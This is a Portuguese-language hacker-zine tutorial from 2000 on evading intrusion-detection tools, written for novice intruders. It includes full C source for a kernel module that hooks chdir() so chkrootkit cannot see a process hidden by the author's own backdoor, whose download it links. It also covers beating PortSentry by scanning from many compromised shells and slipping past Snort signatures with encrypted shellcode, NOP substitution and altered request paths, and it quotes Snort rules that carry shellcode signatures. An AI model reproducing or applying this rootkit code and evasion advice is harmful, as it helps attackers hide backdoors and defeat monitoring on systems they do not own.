###########################################################################
########################## UNSEKURITY SCENES ##############################
###########################################################################

		     *******************************
                     *     TRUQUES CONTRA IDSs     *
		     *******************************

			I Parte (Outubro/00)


Desenvolvido por Nash Leon vulgo coracaodeleao.
nashleon@yahoo.com.br

Este e outros artigos podem ser obtidos em:
http://unsekurity.virtualave.net/ ou
http://coracaodeleao.virtualave.net/

OBS: O Autor nao se responsabiliza pelo mau uso do material contido neste
     texto.Todos os dados e exemplos disponibilizados neste texto possuem
     somente propositos educacionais.

OBS2: Mais um texto onde o publico alvo eh o pessoal NewBie Fucador, se
      voce eh elite ou se considera 'elite', favor nao ler.


------------------------------- INDICE ----------------------------------

1. INTRODUCAO.
2. TRUQUES CONTRA FERRAMENTAS IDS
   2.1 - Chkrootkit
   2.2 - PortSentry
   2.3 - Snort
3. TERMINANDO.
   3.1 - Links e Referencias.
   3.2 - Consideracoes Finais.

--------------------------------------------------------------------------

--------------
1. INTRODUCAO |
--------------

Decidi escrever alguns textos relatando alguns esquemas para serem usados
em cima de algumas ferramentas usadas para aumentar a 'Seguranca' de um
sistema e etc.Os esquemas sao simples, alguns sao apenas teorias, outros
sao formas de se exploitar quando existe uma determinada configuracao de
uma ferramenta, enfim, sao esquemas simples que serao transmitidos com
um unico objetivo, que eh 'agucar' a mente de um fucador para que ele
possa ir obtendo mais conhecimentos sobre como se deve fucar um sistema
em prol de exploitar o mesmo.
Este eh mais um txt meu onde o publico alvo eh o pessoal 'NewBie Fucador',
de modo que nada de extraordinario serah descrito aqui, entao, se voce
eh elite ou se considera 'elite', eh bom ir parando por aqui mesmo.Em
especial os kiddies que alteram home pages, pois voces nao conseguiram
nada de util neste texto e nem em nenhum txt meu!

------------------------------
2. TRUQUES CONTRA FERRAMENTAS |
------------------------------

A grande maioria desses programas podem ser encontrados em repositorios,
mas o que nos interessa eh se a rede alvo possui ele ou nao.Em caso,
afirmativo, podemos ver se existe condicao de passarmos ou tirarmos
proveito deles.

2.1 - Chkrootkit
-----------------

O Chkrootkit, construido por um brasileiro, visa detectar um rootkit
em um sistema Linux atraves de varios esquemas.Ele eh bastante eficiente
em rootkits que alteram arquivos binarios como o famoso 'Linux RootKit'.
Em sua versao atual(0.17), o Chkrootkit implementa uma tecnica p/
detectar rootkits feitos em LKM.

Os mais conhecidos rootkits hoje disponiveis como o adore, o knark e etc,
sao facilmente detectados com este 'conceito' usado pelo chkrootkit.A
tecnica usada pelo chkrootkit se limita a executar um brutal force
via chdir() nos diretorios /proc/X, sendo X um intervalo de 1 a 65535.
Como todo processo em execucao no linux cria um diretorio virtual em
/proc/X, sendo X o seu PID, quando voce esconde um PID, atraves do
brutal force, ele consegue detectar se um processo estah oculto,
denunciando assim o seu rootkit em LKM.

A solucao p/ este problema eh bem trivial, pois o programa que executa
o brutal force se limita ao 'user-space', logo, poderemos interceptar
o systemcall responsavel pelo chdir() e retornar uma informacao falsa.

O LKM abaixo eh capaz de fazer exatamente isto, e se usado junto com
a minha backdoor ou as outras backdoors em LKM, o chkrootkit serah
incapaz de detecta-la, abaixo segue o codigo:

-------------------------- NL_dirproc.c ------------------------------

/* Simples LKM para interceptar chdir().
   Desenvolvido por Nash Leon vulgo coracaodelao.
   nashleon@yahoo.com.br
   http://coracaodeleao.virtualave.net/
   Este programa segue junto a backdoor Sombria v1.01.
   LKM testado em kernel 2.2.13.

   OBS: Existe um Tutorial de Programacao Basica p/ Fucadores em
        Linux(I Parte) feito por mim que ensina o basico sobre LKM.
        Vai um conselho aos que nao conhecem LKM, se voce tiver executando
        a Sombria em sua forma original(soh permite 1 conexao bindshell)
        execute este LKM apenas 1 vez, com o PID definido e depois que
        entrar na bindshell, derrube este LKM, senao o sistema pode
        travar.Com o basico de LKM, voce pode inserir os codigos que
        estao aqui, diretamente em NL_sombria_lkm.c e fazer com que o
        recebimento do PID seja dinamico e um processo reverso p/ o
        mesmo.

*/

#define       MODULE
#define     __KERNEL__

#include <linux/kernel.h>
#include <asm/unistd.h>
#include <asm/uaccess.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/malloc.h>
#include <linux/stat.h>
#include <linux/if.h>
#include <linux/unistd.h>
#include <sys/syscall.h>

/* Defina aqui o diretorio a ser escondido.
   Lembrando que eh /proc + PID escondido. */

#define  PID  "/proc/166"

extern void* sys_call_table[];
int (*original_chdir) (const char *path);

int hacked_chdir(const char *path){
char *test;
char *pid = PID;

test = (char *) kmalloc(strlen(pid)+ 2, GFP_KERNEL);
copy_from_user(test,path,strlen(pid));
test[strlen(pid)] = '\0';


/* Se condicao for verdadeira retorna '-ENOENT' que significa
   "arquivo ou diretorio nao encontrado. A condicao eh:
   Se chdir(argumento) = chdir(PID) retorna -ENOENT. */

if (!strcmp(test,pid)){
kfree(test);
return -ENOENT;
}
}
/* Funcoes Essenciais. */

int init_module(void){
printk("<1> Carregando LKM contra chkrootkit...\n");
original_chdir = sys_call_table[__NR_chdir];
sys_call_table[__NR_chdir] = hacked_chdir;
printk("<1> LKM Carregado com sucesso!!\n");
return 0;
}

void cleanup_module(void)
{
printk("<1> Descarregando LKM..\n");
sys_call_table[__NR_chdir] = original_chdir;
printk("<1> LKM Descarregado com Sucesso!!\n");
}
------------------------------------------------------------------

Lembrando p/ os mais leigos, cuidado com o syslog!:)

A minha backdoor "Sombria" jah possui este codigo e ela atualmente eh
indetectavel pelo chkrootkit v0.17.

A 'licao' que eu deixo aqui, eh que eh muito dificil um programa 
executando no 'user-space' ser realmente eficaz contra um LKM.Mais uma
vez, um rootkit ou mesmo um sniffer executando via LKM torna uma perigosa
e poderosa ferramenta na mao de um fucador!


2.2 - PortSentry
-----------------

Mais um item que servirah apenas p/ contemplar e exemplificar um
conceito de uma tecnica usada por algumas ferramentas de IDS e formas
de se 'passar' por este conceito.

2.2.1 - A ferramenta
---------------------

O 'PortSentry' eh uma boa ferramenta IDS que busca proteger uma rede
contra um 'scaneamento'.O esquema usado por ela eh o seguinte:

Portas de 1 a 20 quando scaneadas 'avisam' rapidamente a ferramenta
que ela estah sendo alvo de uma investida scan.Se voce sabe que uma
rede possui o portsentry instalado nela, nao comece nunca 'chutando'
portas entre este intervalo(1 a 20).As chances de um host que estah
usando 'portsentry' possuir uma destas portas abertas eh bem minima,
porem nao impossivel.Analise antes sempre para se certificar se
realmente vale a pena tentar uma investida em portas neste intervalo.

Varios metodos de scaneamento conhecidos como 'Stealth Scans' tambem 
sao detectados pelo 'portsentry', abaixo seguem os metodos amplamente
conhecidos que ele eh capaz de detectar atualmente:

- Strobe-style scans (connect() scans)
- SYN/Half open scans.
- FIN scans.
- NULL scans.
- XMAS scans.
- UDP scans 

Todos os metodos mais populares sao facilmente detectados pelo portsentry.
Logo, deve-se ter juizo ao se usar ferramentas como o 'Nmap do Fiodor'.
Um texto detalhando varios tipos de scan, inclusive os descritos acima,
pode ser encontrado em www.insecure.org.Existe um txt antigo do c0nd0r
da sekure.org em portugues, mas nao conheco link para o mesmo.


As opcoes de 'defesa' provida pelo 'portsentry' nos deixa numa situacao
bastante 'incomoda'.Abaixo podemos ve-las retiradas do arquivo 
'portsentry.conf' e sua forma na instalacao padrao:

# 0 = Do not block UDP/TCP scans.
# 1 = Block UDP/TCP scans.
# 2 = Run external command only (KILL_RUN_CMD)

BLOCK_UDP="1"
BLOCK_TCP="1"

Se a opcao '2' estiver setada, um comando serah executado, muito
provavelmente a 'queda' do daemon.Por isso, deve-se ter a atencao redobrada
quanto a este problema.Se o daemon 'cair', pode esperar algum tempo e ateh 
mesmo alguns dias p/ investir em uma exploitacao ao alvo.
Por sorte, a maioria dos administradores nao ativam esta opcao, o que
nos dah maiores chances de obtencao de exito.

Uma opcao interessante eh o pricipal motivo deste txt, ou seja, o
portsentry costuma bloquear os pacotes vindos de um determinado IP quando
este IP estah tentando scanear a rede 'protegida' pelo portsentry.
Existem duas opcoes disponiveis que podemos ver no arquivo
'portsentry.conf', sao elas:

###############
# TCP Wrappers#
###############
KILL_HOSTS_DENY="ALL: $TARGET$"

Que fechar o acesso ao sistema para o IP '$TARGET$' via TCP Wrappers, e:

###################
# Dropping Routes:#
###################

# Generic Linux
#KILL_ROUTE="/sbin/route add -host $TARGET$ gw 333.444.555.666"

Que literalmente derruba 'rotas' e adiciona um host numa tabela de filtros
locais.

Em qualquer um dos dois metodos, podemos visualizar que iremos ter
problemas, se e "somente se" permanecermos com o mesmo IP.


2.2.2 - Detectando Portsentry
------------------------------

Detectar o portsentry pode ser uma tarefa 'meio' dificil.Eh mais facil
trabalharmos com o conceito de detectar uma ferramenta IDS - Anti-probe
do que uma versao propriamente dita de um IDS.Mas a pratica nos mostra
algumas coisas que podem de alguma forma nos ajudar na deteccao desta
ferramenta.

De ante-mao, ela eh apenas uma ferramenta Anti-Scan, ou seja, ela nao
eh um IDS completo, que procura filtrar e se precaver das outras tecnicas
fucadoras existentes.

Vejamos abaixo como esta ferramenta reage numa tentativa de scaneamento
usando o famoso 'nmap':

localhost:/usr/local/psionic/portsentry# ./portsentry
Psionic PortSentry - Port Scan Detector.
Copyright 1997,98 Craig H. Rowland <crowland@psionic.com>
Licensing restrictions apply. Please see documentation
Version: 1.0

usage: portsentry [-tcp -udp -stcp -atcp -sudp -audp]

*** PLEASE READ THE DOCS BEFORE USING ***

localhost:/usr/local/psionic/portsentry# ./portsentry -atcp
localhost:/usr/local/psionic/portsentry# ./portsentry -stcp
localhost:/usr/local/psionic/portsentry# ./portsentry -tcp

Carregamos ele para se defender em tres modos, inclusive de scanners
'avancados' em TCP.

Agora no NMAP:

localhost:/nmap-2.3BETA4# nmap -sF -O localhost > local.log

Depois analisamos o arquivo local.log:

Starting nmap V. 2.54BETA1 by fyodor@insecure.org ( www.insecure.org/nmap/
)
Interesting ports on localhost (127.0.0.1):
(The 1487 ports scanned but not shown below are in state: closed)
Port       State       Service
1/tcp      open        tcpmux
7/tcp      open        echo
9/tcp      open        discard
11/tcp     open        systat
15/tcp     open        netstat
21/tcp     open        ftp
23/tcp     open        telnet
37/tcp     open        time
70/tcp     open        gopher
79/tcp     open        finger
80/tcp     open        http
109/tcp    open        pop-2
110/tcp    open        pop-3
111/tcp    open        sunrpc
119/tcp    open        nntp
138/tcp    open        netbios-dgm
139/tcp    open        netbios-ssn
143/tcp    open        imap2
512/tcp    open        exec
513/tcp    open        login
514/tcp    open        shell
515/tcp    open        printer
540/tcp    open        uucp
635/tcp    open        unknown
1080/tcp   open        socks
1524/tcp   open        ingreslock
2000/tcp   open        callbook
2001/tcp   open        dc
6000/tcp   open        X11
6001/tcp   open        X11:1
6667/tcp   open        irc
12345/tcp  open        NetBus
12346/tcp  open        NetBus
31337/tcp  open        Elite
32771/tcp  open        sometimes-rpc5
32772/tcp  open        sometimes-rpc7
32773/tcp  open        sometimes-rpc9
32774/tcp  open        sometimes-rpc11

TCP Sequence Prediction: Class=random positive increments
                         Difficulty=2170631 (Good luck!)
Remote operating system guess: Linux 2.1.122 - 2.2.14

Nmap run completed -- 1 IP address (1 host up) scanned in 16 seconds


Bom.. No teste soh existiram 6 portas abertas, mas o bloqueio feito
pelo portsentry levou o nmap a 'pensar' que todas as portas estao
abertas.Isso em determinados casos representa uma consideravel perda de
tempo.Pois nao tem como de fato sabermos quais portas estao abertas e
quais estao fechadas.Outro problema reside nos logs gerados, ou seja,
seu IP atual estah logado e ateh mesmo 'banido' de acesso no sistema
alvo.Se for ver o sistema de logs, poderah ver algumas coisas do tipo:

Em /var/log/messages:

Sep 13 06:58:33 localhost portsentry[467]: attackalert: Host 127.0.0.1 has
been blocked via dropped route using command: "/sbin/route add -host 127.0.0.1 
gw 333.444.555.666"

Sep 13 06:58:33 localhost portsentry[467]: attackalert: FIN scan from host:
localhost/127.0.0.1 to TCP port: 26

Em portsentry.blocked.atcp:

968839113 - 09/13/2000 06:58:33 Host: localhost/127.0.0.1 Port: 185 TCP
Blocked

E pode-se ter informacoes em portsentry.history, nos arquivos de um
TCP Wrapper, e em arquivos de configuracoes especificas de log.

De qualquer forma a rede jah detectou sua tentativa.Voce possui agora
duas opcoes.. Tentar ou Desistir!

2.2.3 - Eu Tentaria
--------------------

Digamos que voce seja audacioso e que a partir de entao estah mais
determinado do que nunca a 'acessar' esta rede.Ao que tudo indica, eh
uma rede protegida, que possuia boas ferramentas de seguranca e muito
provavelmente um bom administrador.

A teoria basica para se scanear este sistema eh a da 'forca bruta'.
O portsentry permite conexoes as portas, ele barra apenas scaneamento
quando detecta um, ou seja, as opcoes surgem quando tentamos nao
alertar o portsentry de forma direta como fizemos acima usando o nmap
diretamente.Poderiamos fazer o seguinte:

# telnet localhost 21
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 localhost FTP server (Version wu-2.6.0(1) Fri Oct 22 00:38:20 CDT
1999) ready.

1 Tentativa.

# telnet localhost 513
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.

2 Tentativas.

# telnet localhost 514
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Connection closed by foreign host.

3 Tentativas e nada do dito cujo bloquear.

# telnet localhost 37
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
½iOpConnection closed by foreign host.

4 Tentativas.

# telnet localhost 1
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
** MANO - USE UMA TATICA MAIS AVANCADA! *** ESSES SCANNER SAO FACEIS DE
LOGAR..
CUIDADO. NASH LEON.Connection closed by foreign host.

5 Tentativas, e apenas na quinta tentativa ele respondeu com uma mensagem
de Banner... Se voce vir esta mensagem por aih, nao se preocupe, eh o meu
portsentry..:)

Foram necessaria cinco tentativas para que ele realmente detectasse que
esta sendo atacado.Dependendo do admin, isto pode ser diminuido, mas
sempre vai existir uma condicao de pelo menos 2 portas abertas.O IP foi
logado, poderiamos desconectar e voltar com um novo IP e tentarmos
em mais portas.

Mas existe um detalhe ainda maior, que jah foi dito antes, portas menores
de 20 soh basta 1 tentativa e jah era! Por isso, evite scanear essas
portas, e se for usar o nmap, selecione portas melhores que estas.Uma
rede com 'systat' aberto eh uma boa, mas na maioria dos casos nao eh
de bom proveito, pois com o proprio scaneamento voce obtem as informacoes
que o systat pode estar provendo.

Eh obvio que existe um esquema que agiliza isso tudo.Eh uma tecnica
mundialmente conhecida e que eh capaz de scanear toda e qualquer rede
localizada na internet.Ela eh ruidosa e ao mesmo tempo pode deixar
rastros, mas eh uma tecnica bastante eficiente em busca de se 'quebrar'
essas ferramentas IDS.Consiste em Multiplos IPs, scaneamento atraves
de Multiplos IPs. Sabemos que o 'portsentry' vai fechar apos X tentativas,
se nos possuimos vinte shells mundo a fora, poderemos usar essas 20
shells(se algum membro da seguranca acha que eh muito, vah logo sabendo
que conheco pessoas que tem centenas!!!) para tentar uma investida em
conjunto e nos fornecer informacoes 'reais' sobre a rede alvo.No nosso
exemplo, poderiamos usar 5 tentativas desde que nao fosse em determinadas
portas que soh permitem 1 conexao(veja na marra).

A 'licao' que eu deixo aqui, eh que ferramenta como 'portsentry' sao
ineficazes quando o fucador estah realmente disposto! Se uma rede
alvo eh muito cobicada, pode-se levar meses p/ que um fucador de fato
possua conhecimentos plenos a respeito de quais servicos estao sendo
executados nela, mas se o fucador estiver mesmo disposto, o portsentry
serah uma ferramenta completamente ineficaz!

2.3 - Snort
------------

O conceito usado por ele eh mais abrangente do que o do portsentry, e ele 
nao soh procura defender a rede de scaneamentos, mas tambem contra 
exploitacoes diversas.Ele funciona como uma especie de 'sniffer',escutando na
interface da rede e checando os pacotes que estao chegando por ela.Eh um 
verdadeiro canivete suico e eh uma ferramenta que 'depende' muito do 
administrador da rede, ou seja, se o administrador manja de hacking a coisa 
fica dificil, se ele nao manja, acho que nao preciso nem dizer nada.

Trabalhando com a hipotese do administrador nao 'pensar' e nem 'agir' como 
um fucador, ele entao serah mecanico! E irah criar as regras apenas para 
exploits que jah foram publicados e p/ tecnicas amplamente difundidas.
E aih que entra a 'malicia' de um fucador, que irah procurar 'visualizar'
as regras que o administrador disponibilizou em sua ferramenta 'snort'.


Mas vamos lah.. O snort estah escutando na interface, antes de chegar no
daemon, os dados passam pelo snort, entao devemos contemplar esquemas
eficazes para poder atingir algum daemon em cheio, passando pelo snort.

A Sintaxe usada pelo snort para a criacao de regras eh a seguinte:

<funcao> <protocolo> <ip_origem/mask> <intervalo_porta_origem> ->
<ip_destino> <intervalo_porta_destino> <opcoes>

OBS: Isso tudo em uma linha soh!

Sendo algumas das opcoes validas:
msg => Mensagem de saida p/ os arquivo de log/alerta.
logto => Arquivo para logar alertas especificos.
content => Esta opcao le o conteudo a procura de
overflows e exploitacao.

Um exemplo basico seria:


alert tcp any any -> any 21 (msg:"Atras de Format Bug";content:"site exec %p";)

Ou seja.. Se alguem der um telnet p/ a 21 e enviar 'site exec %p' o sistema 
irah detectar e logar uma tentativa de exploitacao.Como ela eh uma ferramenta 
flexivel, em que o administrador fornece regras a vontade, ela se torna um 
desafio, pois se o administrador da rede eh competente, ele saberah quais 
comandos filtrar e como responder caso alguem tente exploitar o sistema dele.
No lugar de 'site exec %p', poderiamos colocar simplesmente '%', isso serve p/ 
visualizarmos as dificuldades que esta ferramenta poderah nos fornecer.

Esta eh sem duvida uma ferramenta muito interessante p/ fucadores, pois
ele serve p/ demonstrar na pratica a 'criatividade' e a eficiencia da tecnica 
fucadora mais conhecida e amplamente difundida em todo o mundo, 
a 'tecnica da MALICIA'!:).Veremos algo nesse sentido mais abaixo.


Criando um arquivo basico de regras, com varias regras p/ detectar uma 
tentiva de exploitacao, poderiamos executar o 'snort' do seguinte modo
(para podermos contemplar mais esquemas):

# snort -D -A full -i lo -c regras.snort

Onde a interface a ser escutada no caso eh a 'lo', o arquivo com regras
definidas por nos eh o 'regras.snort', executando em modo Daemon(D) e
gerando logs de alerta (A) completos em '/var/log/snort.alert'.Se o nosso 
arquivo de regras tivesse aquela linha inicial, nos poderiamos ter o seguinte 
log em /var/log/snort.alert:

[**] Atras de Format Bug [**]
09/21-09:47:08.027151 127.0.0.1:1042 -> 127.0.0.1:21
TCP TTL:64 TOS:0x10 ID:305  DF
*****PA* Seq: 0xF0866349   Ack: 0xF01FD1CC   Win: 0x3CB0
TCP Options => NOP NOP TS: 290004 289437


Ou seja, eh aquilo que haviamos definido na regra p/ ser executada.Se
um 'shell script' age em conjunto com isso e nos dah uma resposta rapida e 
eficaz de protecao ao sistemas, as nossas chances frente ao sistema alvo vao 
diminuindo cada vez mais.Digamos que o admin rode um shell script a cada 3 
minutos, e nesse shell script, ele captura entradas do arquivo 
'/var/log/snort.alert' e consequentemente se defende de um invasor ou de um 
possivel invasor futuro.Em todo o caso, o melhor eh evitar a geracao de 
alerta e 'passar' por esta ferramenta.

Como vimos, a principal vantagem dela eh 'filtrar' o conteudo dos dados
que estao chegando na rede e analisar com um 'banco de dados' criado pelo 
administrador p/ defender a rede contra exploitacoes.O arquivo 'overflow-lib',
traz alguns exemplos de regras que sao usadas p/ proteger a rede contra 
ataques bem conhecidos de 'buffer overflows', vejamos:

--------------------- overflow-lib ------------------------
# $Id: overflow-lib,v 1.3 2000/01/15 11:46:25 fyodor
Exp $
# Buffer overflows go here!

# IMAP buffer overflow
# IMAP buffer overflow
alert tcp any any -> $HOME_NET 143 (msg:"IMAP Buffer Overflow!";
                           content:"|E8 C0FF FFFF|";
flags: PA;)

# x86 named buffer overflow
alert tcp any any -> $HOME_NET 53 (msg:"named Buffer Overflow!";
content:"|CD80 E8D7 FFFF FF|"; flags: PA;)


# New buffer overflows submitted by Martin Markgraf alert tcp any any -> 
          $HOME_NET 110 (msg:"QPOP Buffer Overflow!";
                            content:"|E8 D9FF FFFF|"; flags: PA;)
alert tcp any any -> $HOME_NET 21 (msg:"FTP Buffer Overflow-1!";
                           content:"|5057 440A 2F69|"; flags: PA;)
alert tcp any any -> $HOME_NET 21 (msg:"FTP Buffer Overflow-2!";
                           content:"|5858 5858 582F|"; flags: PA;)


# New BOF from CyberPsychotic, this one detects Duke's wu-ftpd attack
alert tcp any any -> $HOME_NET 21 (msg:"FTP buffer overflow1!";
                                      content:"|5057 440A 2F69|";)

-------------------------------------------------------------

O que nos interessa, eh que o snort vai procurar o conteudo descrito nessas 
regras nos pacotes que chegam na rede, logo, uma rede com snort tem uma 
chance consideravel de estar precavida contra os principais exploits 
publicados hoje em dia.

Analisando outro arquivo de exemplos de regras, o 'RULES.SAMPLE', podemos 
ver algumas coisas interessantes:


----------------------- RULES.SAMPLE ------------------------

# This rule will find SYN FIN scans

alert tcp any any -> 192.168.1.0/24 any (msg:"SYN-FIN scan!"; flags: SF;)

# This one will find TCP NULL scans

alert tcp any any -> 192.168.1.0/24 any (msg:"Null scan!"; flags: 0;)

# This one will find Queso OS fingerprinting attempts
# You can watch the reserved bits in the flag field of TCP packets.  This
# allows you to detect things like Queso scans.  The new bits are specified
# with a "1" and "2".  See the TCP example above for usage.

alert tcp any any -> 192.168.1.0/24 any (msg:"Queso fingerprint";flags: S12;)



[CORACAODELEAO] => NOS EXEMPLOS ACIMA, VEMOS O SNORT LOGAR ALGUNS
                   DOS PRINCIPAIS METODOS DE SCANEAMENTO.



# Here is an example of content based alerting

alert tcp any any -> 192.168.1.0/24 143 (msg:"IMAP Buffer overflow!";
                                  content:"|90E8 C0FF FFFF|/bin/sh";)



[CORACAODELEAO] => ACIMA VEMOS ELE DETECTANDO TENTATIVA DE OVERFLOW
                   NUM SERVIDOR IMAP, ATRAVES DO CONTEUDO.


# here's an example of PHF attack detection where just
a straight text
# string is searched for in the app layer

alert tcp any any -> 192.168.1.0/24 80 (msg:"PHF attempt"; content: "/cgi-bin/phf";)


[CORACAODELEAO] => ACIMA NOS TEMOS ELE DETECTANDO UMA TENTATIVA DE
                   EXPLOITACAO VIA CGI.



#################
# NEW FEATURE: multiple "content" strings per rule
#################
# You can now put multiple content keywords in a single rule specification,
# which enables searching for multiple patterns per packet payload.  This
# can be used to increase the graularity and accuracy of the packet payload
# matching rules.  For example, you can now search for a buffer overflow's
# NOP codes, as well as the "exec" opcodes:


alert tcp any any -> $HOME_NET 143 (content:"|9090 9090 9090 9090|";
             content:"|E8 C0FF FFFF|"; msg:"IMAP Buffer Overflow!";)



[CORACAODELEAO] => ESTA REGRA EH BASTANTE INTERESSANTE.ELA CAPTURA
                   NOP'S(0x90).PROCURANDO DESTA FORMA, BARRAR UMA
                   EXPLOITACAO REMOTA.


---------------------------------------------------------------------


Como podemos ver, as regras sao flexiveis, e dependendo do administrador
da rede, as coisas podem ser muito dificeis.Em uma rede que se preze pela 
seguranca, ferramentas como esta estao cada vez mais ocupando espaco, por 
isso, existe essa necessidade de nao soh teorizarmos tecnicas p/ se passar 
por elas, mas tambem procurarmos atacar diretamente o conceito usado por elas.


No entanto me limitarei neste texto a demonstrar formas basicas de tentar 
exploitar um sistema com o 'snort' em execucao e nao gerar os logs no mesmo, 
levando em consideracao que o administrador da rede nao conhece as principais 
tecnicas fucadoras(XX%) e se limita a definir regras jah amplamente difundidas.


+ Caso 1 - (content:"|E8 C0FF FFFF|"; flags: PA;)

No caso descrito p/ proteger contra exploits do IMAP foi citado a protecao 
contra dados binarios(entre '|' - pipe symbol), mais precisamente a filtragem 
de alguns hexadecimais.O que temos que fazer nesse caso eh criarmos um exploit 
nosso mesmo, diminuindo consideravelmente as chances do 'snort' conhecer a 
sequencia de nossos shellcode em termos de hexa.


+ Caso 2 - (content:"|90E8 C0FF FFFF|/bin/sh";)

Neste caso, podemos contemplar que a string '/bin/sh' enviada em um shellcode 
iria ser detectada pelo snort e consequentemente o sistema seria alertado de 
uma tentativa de exploitacao remota.A grande maioria dos exploits envia a 
string '/bin/sh' inserida no shellcode de forma limpa, sendo facilmente 
detectada via esta regra.Uma forma de passarmos por isto eh 'criptografando' 
nosso shellcode, mais precisamente a string '/bin/sh' ou qualquer comando
desejado.Informacoes sobre shellcode encriptado podem ser obtidas em:

http://coracaodeleao.virtualave.net/artigos/detonastrings.txt
e
http://coracaodeleao.virtualave.net/textos/shellcII.txt

O exploit p/ WU-FTPD do duke, bem como diversos outros exploits jah publicados 
mundo a fora, possuem esta tecnica.Fica evidenciado aqui, mais uma vez, a 
necessidade de se aprender a codar exploits e shellcodes.


+ Caso 3 - (msg:"SYN-FIN scan!"; flags: SF;)
           (msg:"Null scan!"; flags: 0;)
           (msg:"Queso fingerprint";flags: S12;)

Particularmente, eu nao recomendo o uso destas tecnicas de scaneamento.
Acredito que um scanemanto usando 'Multiples IPs' em shells remotas deem 
resultados mais agradaveis e geram menos 'alertas'.A propria captura de um 
banner pode ser bem mais interessante do que a execucao de um fingerprint em
muitos casos onde a rede alvo, eh uma rede que 'se diz segura'.


+ Caso 4 - (content:"|9090 9090 9090 9090|")

Este caso eh bastante interessante.Ele procura detectar uma tentativa
de buffer overflow via captura de NOPs(0x90) no trafego de recebimento
da rede.A grande maioria dos exploits usam NOPs p/ agilizar e tornar
viavel uma exploitacao via buffer overflow.Uma tecnica usada p/ passar
por esta regra do snort, consiste em substituir o envio de instrucoes
NOPs em um exploit por outras que produzam o mesmo resultado.Um texto 
descrevendo pormenores p/ se criar um exploit substituindo a instrucao NOP 
por 'jmp 0x02' pode ser encontrado em:

http://packetstorm.securify.com/groups/r00tabega/stealthcode.txt


+ Caso 5 - (content: "/cgi-bin/phf";)

Bastante interessante esta opcao.Ela procura detectar uma tentativa de
exploitacao remota via bug em CGIs(phf).Quem mexe com seguranca em scripts 
CGIs jah pode ir contemplando possiveis esquemas p/ se passar por isto.Em 
alguns sistemas(serah todos??) nos podemos fazer a mesma requisicao acima do 
seguinte modo: //cgi-bin//phf ; O sistema alvo deverah entender a requisicao 
como verdadeira, mas o snort nao serah capaz de loga-la, pois nao eh a mesma 
string que ele estah a espera.
Do mesmo modo, podemos em shellcodes(comprovado apenas no slack 7.0) usar o
esquema(..//..//..//..//..//..//..//..//..//..//..//) para quebrar chroot() 
sem alertarmos o sistema alvo.

O que fica evidenciado com estes exemplos eh a necessidade do fucador saber 
programar e conhecer todos os possiveis esquemas, fucando direto em busca de
descobrir coisas novas sobre como quebrar essas ferramentas de seguranca.
Existem mais esquemas e possibilidades de nao ser metodico, pois o 
administrador da rede estarah com toda certeza a espera das tecnicas e 
esquemas amplamente conhecidos.

Isto eh o basico sobre o 'snort', cabe a cada um de nos buscar meios
mais eficazes e de certo modo 'exclusivos' contra esta 'poderosa'
ferramenta.Se pudermos ter uma ideia de como 'pensa' o adminitrador
da rede alvo, poderemos de fato o 'surpreender', mas para isso, devemos
investir em obtermos conhecimento de todos os possiveis esquemas que podem
ser usados contra essas ferramentas.

--------------
3. TERMINANDO |
--------------
 
Estude, pratique e conheca!!! Vah mais alem dessas linhas e procure
contemplar maiores esquemas! Compartilhe tambem o que vc sabe e se obter
seus objetos nao 'se vanglorie'! Podemos ver que essas ferramentas apenas
aumentam a seguranca de uma rede, e eh possivel passar por elas! Lembre-se
sempre que do outro lado existe um cerebro tao capacitado ou ateh mesmo
mais capacitado do que o seu! Nunca subestime a inteligencia de um
administrador e muito cuidado na implementacao dessas tecnicas, lembre-se:
"VOCE IRAH SE EXPOR!"


3.1 - Links e Referencias
--------------------------

* Sobre as Ferramentas IDS:

http://packetstorm.securify.com/UNIX/audit/chkrootkit-0.17.tar.gz
http://www.snort.org/Files/snort-1.6.3.tar.gz
http://www.psionic.com/tools/portsentry-1.0.tar.gz

* Sombria Backdoor versao 1.0:

http://coracaodeleao.virtualave.net/private/sombria.1.0.tar.gz

* Home Page Atual do Unsekurity Team:

http://unsekurity.virtualave.net/

* Outros Links Interessantes:

http://www.taldowin.com.br/
http://www.hacker.com.br/
http://www.absoluta.org/
http://www.securenet.com.br/
http://coracaodeleao.virtualave.net/


3.2 - Consideracoes Finais
---------------------------

Ao longo desse ano eu tenho demonstrado varios esquemas contra varias
ferramentas de seguranca! Talvez nao existam textos descrevendo estes
esquemas de maneira tao especificas, pelo menos eu nao conheco! Talvez
eu tenha sido realmente o primeiro a escrever sobre esses esquemas,
contra essas ferramentas, nao conheco nada descrito contra chkrootkit,
contra rootckeck ou mesmo portsentry! Mas o que eu quero dizer eh que
eu nao quero ser o unico! Ficaria muito contente se voce leitor, quem
sabe num futuro breve, disponibilizasse um novo esquema contra essas
ferramentas, ou mesmo, um esquema contra uma 'atualizacao' destas
ferramentas, enfim.. Que algum dos irmaos que estao lendo isto aqui desse
continuidade a isto tudo! Devemos deixar de lado esta ideia 'elitista'
de que devemos manter 'segredo' das nossas descobertas ateh o tumulo!
Nao existe isso na etica hacker e 'segurar' o conhecimento a sih mesmo,
soh serve p/ provar a todos que voce nao eh um hacker!!! Um hacker de
verdade compartilha, pois nao possue medo algum de que sua tecnica
100% eficiente hoje amanha nao seja mais, pois ele sabe que eh capaz
de amanha descobrir algo novo! As vezes uma tecnica que funciona em
um determinado programa pode funcionar em outro, enfim, o que temos
que ter em mente eh se realmente seremos 'corajosos' em tornar publico
nossos conhecimentos visando 'aumentar a seguranca' dos sistemas!!!
Sim, quanto mais seguros eles estiverem melhor p/ o usuario comum
e mais esforco e conhecimento serah requerido dos fucadores eticos!!!
Para quem de fato gosta de fucar, quanto maior o problema, melhor o
cenario e a busca da solucao do problema proporciona uma maior satisfacao!

Nao devemos temer que os esquemas que conhecemos hoje, amanha estejam
ultrapassado, sempre haverah condicoes de 'exploitacao' quando de fato
o 'executor' das tecnicas for um fucador nato! Seja voce desde jah um
fucador nato, irmao NewBie!!!

Um Abraco a Todos.

						Nash Leon.


-------------------------------- EOF ------------------------------------


